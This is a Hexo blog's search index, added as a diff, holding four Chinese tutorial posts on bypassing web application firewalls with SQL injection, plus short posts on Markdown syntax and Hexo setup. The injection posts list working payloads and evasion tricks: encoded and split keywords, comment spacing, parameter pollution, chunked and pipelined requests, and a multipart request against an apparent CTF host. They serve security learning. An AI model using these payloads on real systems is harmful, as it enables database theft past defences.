@@ -1,0 +1,161 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>sql注入的绕过（四）</title>
+      <link href="/article/3822942437/"/>
+      <url>/article/3822942437/</url>
+      
+        <content type="html"><![CDATA[<h2 id="缓冲区溢出绕过"><a href="#缓冲区溢出绕过" class="headerlink" title="缓冲区溢出绕过"></a>缓冲区溢出绕过</h2><p>WAF始终是应用程序，容易受到与其他应用程序相同的软件缺陷的影响。如果出现缓冲区溢漏洞可能会导致WAF崩溃，即使它不会导致代码执行也可能会导致WAF异常运行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select 1)=(Select 0xA*1000) union select 1,2,database();</span><br></pre></td></tr></table></figure><h2 id="花括号绕过"><a href="#花括号绕过" class="headerlink" title="花括号绕过"></a>花括号绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=1 union select &#123;x,1&#125;,&#123;x 2&#125;,database(); </span><br></pre></td></tr></table></figure><p><img src="/article/382294243/pasted-1.png" alt="玖涯博客"></p><h2 id="换行绕过"><a href="#换行绕过" class="headerlink" title="换行绕过"></a>换行绕过</h2><p><img src="/article/382294243/pasted-2.png" alt="玖涯博客"><br>也可以做转码<br><img src="/article/382294243/pasted-3.png" alt="玖涯博客"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> sql注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> sql注入绕过 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>sql注入的绕过（三）</title>
+      <link href="/article/1425039744/"/>
+      <url>/article/1425039744/</url>
+      
+        <content type="html"><![CDATA[<h2 id="双关键词绕过"><a href="#双关键词绕过" class="headerlink" title="双关键词绕过"></a>双关键词绕过</h2><p>原理是使用了函数将危险语句替换为空，利用这一点可以构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=1 UNunionION SEselectLECT 1,2,3;</span><br><span class="line">过滤后为</span><br><span class="line">select * from user where id=1 UNION SELECT 1,2,3;</span><br><span class="line">得到我们需要的payload</span><br></pre></td></tr></table></figure><h2 id="二次编码绕过"><a href="#二次编码绕过" class="headerlink" title="二次编码绕过"></a>二次编码绕过</h2><p>需要后端使用url_decode()函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,2,3,4#</span><br><span class="line">第一次转码</span><br><span class="line">%2d%31%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32</span><br><span class="line">%2c%33%2c%34%23</span><br><span class="line">第二次转码</span><br><span class="line">%25%32%64%25%33%31%25%32%30%25%37%35%25%36%65%25%36%39%2</span><br><span class="line">5%36%66%25%36%65%25%32%30%25%37%33%25%36%35%25%36%63%25%</span><br><span class="line">36%35%25%36%33%25%37%34%25%32%30%25%33%31%25%32%63%25%33</span><br><span class="line">%32%25%32%63%25%33%33%25%32%63%25%33%34%25%32%33</span><br></pre></td></tr></table></figure><h2 id="多参数拆分绕过"><a href="#多参数拆分绕过" class="headerlink" title="多参数拆分绕过"></a>多参数拆分绕过</h2><p>常见的比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select * from users where username=&#x27;$uname&#x27; and password=&#x27;passwd&#x27;&quot;</span><br></pre></td></tr></table></figure><p>可以利用username和password两个参数构造闭合语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">传入username=111/*&amp;password=*/&#x27; or 1=1 #</span><br><span class="line">最终到数据库是这样</span><br><span class="line">select * from users where username=&#x27;111/*&#x27; and password=&#x27;*/&#x27; or 1=1 #&#x27;</span><br></pre></td></tr></table></figure><p>也可以把关键词分开放，绕过waf拦截</p><h2 id="分块传输绕过"><a href="#分块传输绕过" class="headerlink" title="分块传输绕过"></a>分块传输绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">头部添加 Transfer-Encoding: chunked</span><br><span class="line">然后随机长度分割字符串，标明长度，用换行分开</span><br><span class="line">结尾为0长度加两个换行</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/article/142503974/pasted-1.png" alt="玖涯博客"></p><p><img src="/article/142503974/pasted-3.png" alt="玖涯博客"><br>长度后面可以加随机值</p><p><img src="/article/142503974/pasted-4.png" alt="玖涯博客"></p><h2 id="信任白名单绕过"><a href="#信任白名单绕过" class="headerlink" title="信任白名单绕过"></a>信任白名单绕过</h2><p>有些waf自带文件白名单，对白名单文件不会有拦截<br>常见如<br>&#x2F;phpmyadmin<br>&#x2F;admin<br>&#x2F;admin.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">用法就是payload中带上文件名</span><br><span class="line"></span><br><span class="line">http://www.test.com/?a=/phpmyadmin&amp;id=1&#x27; or 1=1#</span><br><span class="line">http://www.test.com/phpmyadmin&amp;id=1&#x27; or 1=1#</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="静态文件绕过"><a href="#静态文件绕过" class="headerlink" title="静态文件绕过"></a>静态文件绕过</h2><p>除了白名单信任文件和目录外，还有一部分 waf 并不会对静态文件进行拦截。<br>例如 图片文件 jpg 、png 、gif 或者 css 、js 会对这些静态文件的操作不会<br>进行检测从而绕过 waf 拦截。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.test.com/1.jpg&amp;id=1&#x27; or 1=1#</span><br></pre></td></tr></table></figure><h2 id="pipline绕过"><a href="#pipline绕过" class="headerlink" title="pipline绕过"></a>pipline绕过</h2><p>http请求头部包含了一个 Connection 字段，一般值为 close，apache 等容器根据这个字段<br>决定是保持该 tcp 连接或是断开。当发送的内容太大，超过一个 http 包容量，需<br>要分多次发送时，值会变成 keep-alive，直到所发送内容结束 Connection 为 close 为止</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用 burpsuite 抓包提交 复制整个包信息放在第一个包最后，把第一个包 close 改成 keep-alive ,把 brupsuite 自动更新 Content-Length 勾去掉。</span><br></pre></td></tr></table></figure><p><img src="/article/142503974/pasted-5.png" alt="玖涯博客"></p><p><img src="/article/142503974/pasted-6.png" alt="玖涯博客"></p><h2 id="Content-Type绕过"><a href="#Content-Type绕过" class="headerlink" title="Content-Type绕过"></a>Content-Type绕过</h2><p>在 http 头里的 Content-Type 提交表单支持三种协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">application/x-www-form-urlencoded 编码模式  post 提交  </span><br><span class="line">multipart/form-data 文件上传模式  </span><br><span class="line">text/plain 文本模式</span><br></pre></td></tr></table></figure><p>文件头的属性 是传输前对提交的数据进行编码发送到服务器。<br>其中 multipart&#x2F;form-data 表示该数据被编码为一条消息，页上的每个控件对应消<br>息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">利用表单构造数据包</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;submit&lt;/title&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=&quot;http://4a2f28ef-d378-4097-b864-ff025ec2b306.node4.buuoj.cn:81&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    query&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">然后利用burp抓包</span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 4a2f28ef-d378-4097-b864-ff025ec2b306.node4.buuoj.cn:81</span><br><span class="line">Content-Length: 152</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAmyB5XuQRqv04nb6</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://localhost/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=914a91e5083f6c12de0b79ae76a3e703</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryAmyB5XuQRqv04nb6</span><br><span class="line">Content-Disposition: form-data; name=&quot;query&quot;</span><br><span class="line"></span><br><span class="line">;show databases;</span><br><span class="line">------WebKitFormBoundaryAmyB5XuQRqv04nb6--</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到我们需要的数据包，发送即可</p><h2 id="order-by绕过"><a href="#order-by绕过" class="headerlink" title="order by绕过"></a>order by绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当order by被禁用时  </span><br><span class="line">可以使用into @a,@b来绕过</span><br></pre></td></tr></table></figure><p><img src="/article/142503974/pasted-7.png" alt="玖涯博客"><br>还是很好用的</p><h2 id="http相同参数请求绕过"><a href="#http相同参数请求绕过" class="headerlink" title="http相同参数请求绕过"></a>http相同参数请求绕过</h2><p>需要后台设置参数request接收方式<br>一些waf针对不同接收方式有不同规则，或者只过滤一种方式，利用这一点变换请求方式可以绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同时get和post传值</span><br></pre></td></tr></table></figure><p>有些waf只要同时存在get，post会优先匹配post</p><hr/><p>再见！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> sql注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> sql注入绕过 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>sql注入的绕过（二）</title>
+      <link href="/article/911024130/"/>
+      <url>/article/911024130/</url>
+      
+        <content type="html"><![CDATA[<h2 id="逗号绕过"><a href="#逗号绕过" class="headerlink" title="逗号绕过"></a>逗号绕过</h2><h3 id="substr（）、mid（）截取字符串"><a href="#substr（）、mid（）截取字符串" class="headerlink" title="substr（）、mid（）截取字符串"></a>substr（）、mid（）截取字符串</h3><p><img src="/article/91102413/pasted-1.png" alt="玖涯博客"></p><p>数据库为’dvwa’。</p><h3 id="join自连接绕过"><a href="#join自连接绕过" class="headerlink" title="join自连接绕过"></a>join自连接绕过</h3><p>union select 1,2 #等价于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select * from (select 1)a join (select 2)b</span><br></pre></td></tr></table></figure><p><img src="/article/91102413/pasted-2.png" alt="玖涯博客"></p><h3 id="like模糊匹配绕过"><a href="#like模糊匹配绕过" class="headerlink" title="like模糊匹配绕过"></a>like模糊匹配绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=1 and (select database() like &#x27;%d%&#x27;) ;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>别忘了外面的括号</strong></p><p><img src="/article/91102413/pasted-3.png" alt="玖涯博客"></p><h3 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h3><p>如果使用limit 0,1来限制条数，可以这样写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">limit 1;</span><br><span class="line">limit 1 offset 0;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不过我喜欢简单粗暴一点的group_concat()</p><p><img src="/article/91102413/pasted-4.png" alt="玖涯博客"></p><h2 id="and、or、not、xor绕过"><a href="#and、or、not、xor绕过" class="headerlink" title="and、or、not、xor绕过"></a>and、or、not、xor绕过</h2><p>目前主流的 waf 都会对 id&#x3D;1 and 1&#x3D;2、id&#x3D;1 or 1&#x3D;2、id&#x3D;0 or 1&#x3D;2<br>id&#x3D;0 xor 1&#x3D;1 limit 1 、id&#x3D;1 xor 1&#x3D;2<br>对这些常见的 SQL 注入检测语句进行拦截。<br>可以用替换字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and 等于&amp;&amp;</span><br><span class="line">or 等于 ||</span><br><span class="line">not 等于 !</span><br><span class="line">xor 等于|</span><br></pre></td></tr></table></figure><h2 id="ascii对比绕过"><a href="#ascii对比绕过" class="headerlink" title="ascii对比绕过"></a>ascii对比绕过</h2><p>这个做题很常用，适用于bool盲注和延时盲注  <br>以后再细说</p><h2 id="等于号绕过"><a href="#等于号绕过" class="headerlink" title="等于号绕过"></a>等于号绕过</h2><h3 id="使用in和not-in"><a href="#使用in和not-in" class="headerlink" title="使用in和not in"></a>使用in和not in</h3><p><img src="/article/91102413/pasted-5.png" alt="玖涯博客"></p><h3 id="使用like、relike、regexp"><a href="#使用like、relike、regexp" class="headerlink" title="使用like、relike、regexp"></a>使用like、relike、regexp</h3><p>like模糊匹配，后两个是正则</p><p><img src="/article/91102413/pasted-6.png" alt="玖涯博客"></p><hr/><p>再见</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> sql注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> sql注入绕过 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>sql注入的绕过（一）</title>
+      <link href="/article/704130570/"/>
+      <url>/article/704130570/</url>
+      
+        <content type="html"><![CDATA[<h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><p>两个空格代替一个空格，用 Tab 代替空格  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 %00 /**/ /*!*/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1/*!union*//*!select*/1,2,3,4;</span><br><span class="line">select * from users where id=1/**/union/**/select/**/1,2,3,4;</span><br></pre></td></tr></table></figure><p>%09 TAB 键（水平)<br>%0a 新建一行<br>%0c 新的一页<br>%0d return 功能<br>%0b TAB 键（垂直）<br>%a0 空格<br><code>/*!六位数字*/</code> 特殊，也可以当空格</p><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p><img src="/../article/70413057/pasted-1.png" alt="玖涯博客"></p><h2 id="浮点数绕过"><a href="#浮点数绕过" class="headerlink" title="浮点数绕过"></a>浮点数绕过</h2><p>整型注入时用来绕过一些waf匹配规则</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=1.0 union select 1,2,3;</span><br><span class="line">select * from user where id=1E0 union select 1,2,3;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/article/70413057/pasted-3.png" alt="玖涯博客"></p><h2 id="NULL值绕过"><a href="#NULL值绕过" class="headerlink" title="NULL值绕过"></a>NULL值绕过</h2><p>同浮点数绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=NULL union select 1,2,3;</span><br><span class="line">select * from user where id=\N union select 1,2,3;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/article/70413057/pasted-7.png" alt="玖涯博客"></p><h2 id="单引号绕过"><a href="#单引号绕过" class="headerlink" title="单引号绕过"></a>单引号绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=1 union select 1,2,(select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 1);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里waf拦截单引号时，使用双引号绕过，或者直接用十六进制</p><p><img src="/article/70413057/pasted-8.png" alt="玖涯博客"></p><h2 id="加库名绕过"><a href="#加库名绕过" class="headerlink" title="加库名绕过"></a>加库名绕过</h2><p>有些waf不会匹配库名.表名这种模式 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where id=1 union select 1,2,3 from dvwa.users;</span><br></pre></td></tr></table></figure><p><img src="/article/70413057/pasted-9.png" alt="玖涯博客"></p><h2 id="distinct绕过和all绕过"><a href="#distinct绕过和all绕过" class="headerlink" title="distinct绕过和all绕过"></a>distinct绕过和all绕过</h2><p>去除重复值，突破waf拦截（?）</p><p><img src="/article/70413057/pasted-10.png" alt="玖涯博客"></p><p>显示全部<br><img src="/article/70413057/pasted-14.png" alt="玖涯博客"></p><h2 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h2><p>在一些字段加反引号绕过waf，可加可不加</p><p><img src="/article/70413057/pasted-11.png" alt="玖涯博客"></p><h2 id="脚本语言特性绕过"><a href="#脚本语言特性绕过" class="headerlink" title="脚本语言特性绕过"></a>脚本语言特性绕过</h2><p>在 php 语言中 id&#x3D;1&amp;id&#x3D;2 后面的值会自动覆盖前面的值，不同的语言有不同的<br>特性。可以利用这点绕过一些 waf 的拦截。</p><blockquote><p>有些 waf 回去匹配第一个 id 参数 1%00 %00 是截断字符，waf 会自动截断 从而<br>不会检测后面的内容。到了程序中 id 就是等于 id&#x3D;2 union select 1,2,3 从绕过注<br>入拦截。</p></blockquote><p><img src="/article/70413057/pasted-12.png" alt="玖涯博客"></p><p><img src="/article/70413057/pasted-13.png" alt="玖涯博客"></p><hr><p>再见</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> sql注入 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> sql注入绕过 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Markdown书写语法</title>
+      <link href="/article/3146058843/"/>
+      <url>/article/3146058843/</url>
+      
+        <content type="html"><![CDATA[<h3 id="markdown语法"><a href="#markdown语法" class="headerlink" title="markdown语法"></a>markdown语法</h3><ol><li>分段：两个回车  </li><li>换行：两个空格加回车  </li><li>标题：1~6个#号 表示一级到六级  </li><li>引用: &gt;  </li><li>列表 * + - 1.加空格 子列表加四个空格</li><li>链接:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[文字](链接地址)</span><br></pre></td></tr></table></figure></li><li>图片:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![文字](链接地址)</span><br></pre></td></tr></table></figure></li><li>强调:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">**文字**,__文字__,   /*!加粗强调*/</span><br><span class="line">_文字_，*文字*    /*!斜体*/</span><br></pre></td></tr></table></figure></li><li>高亮：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`文字`</span><br></pre></td></tr></table></figure></li><li>删除线： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~~文字~~~</span><br></pre></td></tr></table></figure></li><li>表格：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">| 课程表 | 星期一  |  星期二  |  星期三  | 星期四  |  星期五  |</span><br><span class="line">| :----: | :-----: | :------: | :------: | :-----: | :------: |</span><br><span class="line">|  上午  |  Math   | Chinese  |  Music   |  Math   | Chinese  |</span><br><span class="line">|  下午  | Chinese |    PE    |   Math   | English | Computer |</span><br><span class="line">| 晚自习 | English | Computer | Computer |  Math   | Chinese  |</span><br></pre></td></tr></table></figure></li></ol>]]></content>
+      
+      
+      <categories>
+          
+          <category> 语言 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> markdown </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Hexo博客搭建(不定时更新)</title>
+      <link href="/article/327304246/"/>
+      <url>/article/327304246/</url>
+      
+        <content type="html"><![CDATA[<p><font size=3>下面是搭博客搜集的一些帖子，大家可以参考一下</font></p><hr><p>cactus主题美化:<a href="https://blog.csdn.net/Reinhart_L/article/details/122587975">https://blog.csdn.net/Reinhart_L/article/details/122587975</a><br/></p><p>网页中嵌入:<a href="https://blog.csdn.net/H_define/article/details/115054448">https://blog.csdn.net/H_define/article/details/115054448</a><br/><br><a href="https://blog.csdn.net/blue_zy/article/details/79071414?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-79071414-blog-113779387.pc_relevant_aa_2&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1-79071414-blog-113779387.pc_relevant_aa_2&utm_relevant_index=1">为网页增加评论区valine</a>:   链接有点长。。<br><br/>hexo配置文件详解:<a href="https://blog.csdn.net/zemprogram/article/details/104288872">https://blog.csdn.net/zemprogram/article/details/104288872</a><br/><br><a href="https://blog.csdn.net/Mculover666/article/details/101525678?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166565351616782395350678%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=166565351616782395350678&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-15-101525678-null-null.nonecase&utm_term=hexo&spm=1018.2226.3001.4450">修改文章永久链接为随机数</a><br/></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CMS </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> hexo </tag>
+            
+            <tag> source </tag>
+            
+            <tag> study </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
